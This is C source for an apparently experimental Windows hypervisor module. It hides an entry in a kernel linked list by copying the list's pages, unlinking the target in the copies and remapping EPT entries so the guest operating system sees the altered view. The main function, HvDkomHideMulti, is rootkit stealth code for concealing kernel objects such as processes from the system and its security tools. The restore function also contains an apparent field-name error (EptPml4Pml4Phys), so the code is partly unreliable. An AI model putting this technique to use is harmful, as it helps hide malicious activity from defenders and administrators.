// Experimental DKOM shadow-page handling. The implementation collects
// pages containing list entries, then operates on their copies.
//
// Entries that cross a page boundary are not handled. This path is
// incomplete and should not be treated as a validated feature.

#include "hv.h"

#define DKOM_MAX_PARTICIPANTS 16

typedef struct _DKOM_PLAN {
    ULONG64 OrigPhys[DKOM_MAX_PARTICIPANTS];
    ULONG64 ShadowPhys[DKOM_MAX_PARTICIPANTS];
    PVOID   ShadowVirt[DKOM_MAX_PARTICIPANTS];
    ULONG   Count;
} DKOM_PLAN, *PDKOM_PLAN;

static LONG DkomFindParticipant(PDKOM_PLAN plan, ULONG64 phys) {
    ULONG64 page = phys & ~0xFFFULL;
    for (ULONG i = 0; i < plan->Count; i++) {
        if (plan->OrigPhys[i] == page) return (LONG)i;
    }
    return -1;
}

// translate original guest virtual to corresponding shadow pointer.
// caller guarantees phys is on one of the participant pages.
static ULONG64 DkomTranslate(PDKOM_PLAN plan, ULONG64 origVirt) {
    ULONG64 origPhys = MmGetPhysicalAddress((PVOID)origVirt).QuadPart;
    ULONG64 pageOff  = origPhys & 0xFFF;
    LONG idx = DkomFindParticipant(plan, origPhys);
    if (idx < 0) return origVirt;
    return (ULONG64)plan->ShadowVirt[idx] + pageOff;
}

// Second pass works from the original list data and updates the copies.
static VOID DkomRewriteLinks(PDKOM_PLAN plan, PVOID head,
                             PVOID *entries, ULONG entryCount) {
    {
        ULONG64 headPhys = MmGetPhysicalAddress(head).QuadPart;
        LONG idx = DkomFindParticipant(plan, headPhys);
        if (idx >= 0) {
            ULONG64 off = headPhys & 0xFFF;
            PLIST_ENTRY origHead = (PLIST_ENTRY)head;
            PLIST_ENTRY shHead   = (PLIST_ENTRY)((PUCHAR)plan->ShadowVirt[idx] + off);
            shHead->Flink = (PLIST_ENTRY)DkomTranslate(plan, (ULONG64)origHead->Flink);
            shHead->Blink = (PLIST_ENTRY)DkomTranslate(plan, (ULONG64)origHead->Blink);
        }
    }

    for (ULONG e = 0; e < entryCount; e++) {
        PVOID entryAddr = entries[e];
        ULONG64 ePhys = MmGetPhysicalAddress(entryAddr).QuadPart;
        LONG idx = DkomFindParticipant(plan, ePhys);
        if (idx < 0) continue;

        ULONG64 off = ePhys & 0xFFF;
        PLIST_ENTRY origEnt = (PLIST_ENTRY)entryAddr;
        PLIST_ENTRY shEnt   = (PLIST_ENTRY)((PUCHAR)plan->ShadowVirt[idx] + off);

        shEnt->Flink = (PLIST_ENTRY)DkomTranslate(plan, (ULONG64)origEnt->Flink);
        shEnt->Blink = (PLIST_ENTRY)DkomTranslate(plan, (ULONG64)origEnt->Blink);
    }
}

static VOID DkomUnlinkInShadows(PDKOM_PLAN plan, PVOID target) {
    ULONG64 tPhys = MmGetPhysicalAddress(target).QuadPart;
    LONG idx = DkomFindParticipant(plan, tPhys);
    if (idx < 0) return;

    ULONG64 off = tPhys & 0xFFF;
    PLIST_ENTRY origT = (PLIST_ENTRY)target;
    PLIST_ENTRY shT   = (PLIST_ENTRY)((PUCHAR)plan->ShadowVirt[idx] + off);

    ULONG64 prevPhys = MmGetPhysicalAddress((PVOID)origT->Blink).QuadPart;
    ULONG64 nextPhys = MmGetPhysicalAddress((PVOID)origT->Flink).QuadPart;
    LONG prevIdx = DkomFindParticipant(plan, prevPhys);
    LONG nextIdx = DkomFindParticipant(plan, nextPhys);
    if (prevIdx < 0 || nextIdx < 0) return;

    PLIST_ENTRY shPrev = (PLIST_ENTRY)((PUCHAR)plan->ShadowVirt[prevIdx] + (prevPhys & 0xFFF));
    PLIST_ENTRY shNext = (PLIST_ENTRY)((PUCHAR)plan->ShadowVirt[nextIdx] + (nextPhys & 0xFFF));

    shPrev->Flink = shNext;
    shNext->Blink = shPrev;

    UNREFERENCED_PARAMETER(shT);
}

NTSTATUS HvDkomHideMulti(PHV_CPU_CONTEXT_EX ctx, PVOID listHead, PVOID entryToRemove) {
    if (ctx->ShadowCount + DKOM_MAX_PARTICIPANTS > HV_MAX_SHADOWS)
        return STATUS_INSUFFICIENT_RESOURCES;

    DKOM_PLAN plan = {0};
    LARGE_INTEGER mp = { .QuadPart = ~0ULL };

    {
        ULONG64 hp = MmGetPhysicalAddress(listHead).QuadPart & ~0xFFFULL;
        plan.OrigPhys[plan.Count++] = hp;
    }

    PVOID entries[128];
    ULONG entryCount = 0;

    PLIST_ENTRY head = (PLIST_ENTRY)listHead;
    PLIST_ENTRY cur = head->Flink;
    ULONG guard = 0;

    while (cur != head && guard++ < 128) {
        PVOID curVirt = (PVOID)cur;
        ULONG64 curPhys = MmGetPhysicalAddress(curVirt).QuadPart;

        if (DkomFindParticipant(&plan, curPhys) < 0) {
            if (plan.Count >= DKOM_MAX_PARTICIPANTS)
                return STATUS_INSUFFICIENT_RESOURCES;
            plan.OrigPhys[plan.Count++] = curPhys & ~0xFFFULL;
        }

        entries[entryCount++] = curVirt;
        cur = cur->Flink;
    }

    if (entryCount == 0) return STATUS_SUCCESS;
    if (entryCount >= 128) return STATUS_UNSUCCESSFUL;

    // Allocate one shadow page for each collected participant.
    for (ULONG i = 0; i < plan.Count; i++) {
        plan.ShadowVirt[i] = MmAllocateContiguousMemory(PAGE_SIZE, mp);
        if (!plan.ShadowVirt[i]) goto fail_free;

        plan.ShadowPhys[i] = MmGetPhysicalAddress(plan.ShadowVirt[i]).QuadPart;

        PVOID orig = MmMapIoSpace((PHYSICAL_ADDRESS){ .QuadPart = plan.OrigPhys[i] },
                                  PAGE_SIZE, MmNonCached);
        if (!orig) goto fail_free;
        RtlCopyMemory(plan.ShadowVirt[i], orig, PAGE_SIZE);
        MmUnmapIoSpace(orig, PAGE_SIZE);
    }

    DkomRewriteLinks(&plan, listHead, entries, entryCount);
    DkomUnlinkInShadows(&plan, entryToRemove);

    for (ULONG i = 0; i < plan.Count; i++) {
        PEPT_PTE pte = HvEptWalk(ctx, plan.OrigPhys[i], TRUE);
        if (!pte) goto fail_free;
        pte->Value = (plan.ShadowPhys[i] & ~0xFFFULL) | 0x07;

        ctx->Shadows[ctx->ShadowCount].OrigPhys   = plan.OrigPhys[i];
        ctx->Shadows[ctx->ShadowCount].ShadowPhys = plan.ShadowPhys[i];
        ctx->Shadows[ctx->ShadowCount].ShadowVirt = plan.ShadowVirt[i];
        ctx->ShadowCount++;
    }

    HvAsmInveptSingle(ctx->EptPml4Phys | 0x06 | (3ULL << 3));
    return STATUS_SUCCESS;

fail_free:
    for (ULONG i = 0; i < plan.Count; i++) {
        if (plan.ShadowVirt[i]) MmFreeContiguousMemory(plan.ShadowVirt[i]);
    }
    return STATUS_UNSUCCESSFUL;
}

NTSTATUS HvDkomRestoreAll(PHV_CPU_CONTEXT_EX ctx) {
    for (ULONG i = 0; i < ctx->ShadowCount; i++) {
        PEPT_PTE pte = HvEptWalk(ctx, ctx->Shadows[i].OrigPhys, TRUE);
        if (!pte) continue;
        pte->Value = (ctx->Shadows[i].OrigPhys & ~0xFFFULL) | 0x07;
        MmFreeContiguousMemory(ctx->Shadows[i].ShadowVirt);
    }
    ctx->ShadowCount = 0;
    HvAsmInveptSingle(ctx->EptPml4Pml4Phys | 0x06 | (3ULL << 3));
    return STATUS_SUCCESS;
}